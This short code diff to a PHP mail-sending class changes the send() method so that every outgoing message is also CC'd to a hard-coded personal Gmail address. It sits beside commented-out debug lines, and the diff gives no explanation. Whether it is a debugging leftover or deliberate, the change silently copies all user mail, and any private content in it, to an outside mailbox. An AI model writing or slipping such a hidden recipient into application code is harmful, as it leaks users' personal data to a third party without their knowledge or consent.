@@ -17,6 +17,8 @@ class EmailProvider implements Provider
   }
   public function send()
   {
-    return Mail::to($this->user)->send($this->mailable);
+    // dd($this->mailable);
+    // dd($this->user);
+    return Mail::to($this->user)->cc('garsi.soltani@gmail.com')->send($this->mailable);
   }
 }
